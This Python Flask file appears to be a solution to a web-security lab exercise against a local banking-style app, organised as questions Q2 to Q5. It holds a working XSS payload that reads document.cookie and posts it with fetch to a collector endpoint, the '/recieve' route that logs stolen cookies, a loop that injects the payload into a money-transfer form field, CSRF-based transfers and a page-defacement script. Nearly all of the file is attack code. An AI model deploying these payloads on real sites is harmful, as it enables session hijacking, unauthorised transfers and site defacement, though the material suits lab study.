from cmath import log
from distutils.log import Log
import json
from flask import render_template, redirect, request, flash, make_response
from webapp import app
from requests import Request, Session
import requests
from bs4 import BeautifulSoup
import os
from flask_cors import cross_origin


xss_cookie_stealing_script = "<script>cookies = document.cookie.split(); console.log(cookies); fetch('http://127.0.0.1:3030/recieve', {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({'cookies': cookies})});</script>"


###################################
## Transfer functionality for Q2 ##
###################################
#=========[Occurs because GET and POST operations are interchangable, along with CSRF tokens not working]==============#

@app.route('/Q2', methods=['GET', 'POST'])
def doneLoginPage():
    return render_template("q2.html", reciever="Gustaf0")



#####################
## Cookie Alert Q3 ##
#####################

@app.route('/Q3', methods=['GET', 'POST'])
def cookieGet():

    return render_template("q3.html", script=xss_cookie_stealing_script)


#########################
## Test directories Q4 ##
#########################
#========[CORS seems to only apply to certain requests https://stackoverflow.com/questions/36958999/cors-is-it-a-client-side-thing-a-server-side-thing-or-a-transport-level-thin]==========#
@app.route('/Q4', methods=['GET', 'POST'])
def Q4():
    webSession = Session()

    url = "http://127.0.0.1:5000/Q4"
    magicNumber = None

    #Look for string, "Can not transfer (money amount and script)"
    for j in range(10):
        form = {
            "username": "Gustaf0",
            "money": f"{j}{xss_cookie_stealing_script}"
        }

        response = webSession.post(url, form)
        if ("Money has been transfered!" in response.text):
            print(j)
            magicNumber = j
            break

    return render_template("q4.html", script=f"{magicNumber}{xss_cookie_stealing_script}")


###############
## Deface Q5 ##
###############
@app.route("/Q5", methods=["GET", "POST"])
def Q5():
    image_script = '<script>var img = document.createElement("img"); \
img.src = "http://www.google.com/intl/en_com/images/logo_plain.png"; \
var form = document.getElementById("transfer-form"); \
form.appendChild(img); </script>'


    return render_template("q5.html", script=image_script)


@app.route("/recieve", methods=["GET", "POST"])
@cross_origin()
def recieve():
    payload = request.get_json()
    print(payload)
    return "Everthing is good", 200